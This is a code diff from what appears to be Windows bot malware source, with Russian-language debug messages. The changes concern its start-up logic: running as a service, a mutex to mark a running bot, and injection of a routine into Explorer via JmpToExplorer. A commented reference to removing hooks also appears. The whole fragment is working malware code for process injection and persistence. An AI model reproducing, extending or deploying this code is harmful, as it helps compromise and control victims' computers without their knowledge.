@@ -214,6 +214,7 @@ static DWORD WINAPI NOD32Dll(void*)
 void ExplorerMain()
 {
 	MDBG("Main", "----------------- ExplorerMain -----------------");
+	MDBG("Main", "Appliation (PID:%d) %s", Bot->PID(), Bot->ApplicationName().t_str());
 	MDBG("Main", "WorkPath %s  WorkPathHash %d", BOT::GetWorkPathInSysDrive() ,BOT::GetWorkFolderHash());
 
 	// Создаем мьютекс запущенного бота для сигнализации другим 
@@ -291,10 +292,12 @@ int APIENTRY MyMain()
 
 	MDBG("Main", "Запускается бот. Версия бота %s\r\nEXE: %s", BOT_VERSION, Bot->ApplicationName().t_str());
 	
+#ifdef INSTALL_BOT_AS_SERVICE
 	// Проверяем сервис запущен или нет
 	if (BOT::IsService())
 	{
 		MDBG("Main", "Стартует сервис");
+		MDBG("Main", "Рабочий каталог %s", BOT::GetBotPath().t_str());
 		// Если бот ещё не  запущен, то выполняем инжект в эксплорер
 		BOT::SetBotType(BotService);
 
@@ -302,6 +305,7 @@ int APIENTRY MyMain()
 		{
 			//JmpToExplorer(ExplorerRoutine);
 			MDBG("Main", "Сервис инжектится в Explorer");
+			dwExplorerSelf = 1;
 			JmpToExplorer(ExplorerRoutine);
 		}
 
@@ -309,6 +313,7 @@ int APIENTRY MyMain()
 		pExitProcess(0);
 		return 0;
 	}
+#endif
 
 	MDBG("Main", "Звпускается Ring3 версия бота");
 	// Запускается ринг3 версия
@@ -322,12 +327,6 @@ int APIENTRY MyMain()
 	}
 
 	MDBG("Main", "Запускается бот. Версия бота %s", BOT_VERSION);
-
-	#if defined(DEBUGBOT) && defined(DebugUtils)
-		if (!StartInDebugingMode(true))
-			return 0;
-	#endif
-
 
 
 	//UnhookDlls(); //снимаем хуки
